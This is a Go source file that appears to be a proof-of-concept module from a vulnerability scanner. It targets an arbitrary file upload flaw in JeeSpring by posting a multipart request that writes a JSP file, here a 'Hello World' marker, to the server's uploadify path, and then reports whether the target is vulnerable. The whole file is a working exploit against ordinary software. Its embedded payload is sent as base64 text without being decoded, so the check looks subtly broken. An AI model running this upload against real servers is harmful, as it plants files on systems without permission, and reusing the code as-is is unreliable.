package poc

import (
	"github.com/fatih/color"
	"ssp/common"
	"strings"
)

func JeeSpring_2023(url, proxyURL string) {
	headers := map[string]string{
		"User-Agent":      common.GetRandomUserAgent(),
		"Content-Type":    "multipart/form-data; boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL",
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
		"Connection":      "close",
	}

	payload := `LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo=`
	payloadBytes := []byte(payload)
	path := "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"

	resp, body, err := common.MakeRequest(url+path, "POST", proxyURL, headers, string(payloadBytes))
	if err != nil {
		color.Yellow("[-] %s 请求失败，跳过漏洞检查\n", url)
		return
	}

	if strings.Contains(string(body), "jsp") && resp.StatusCode == 200 {
		common.PrintVulnerabilityConfirmation("JeeSpring_2023任意文件上传漏洞", url, "Null", "7")
		common.Vulnum++
	} else {
		color.Yellow("[-] %s 未发现2023JeeSpring任意文件上传漏洞\n", url)
	}
}
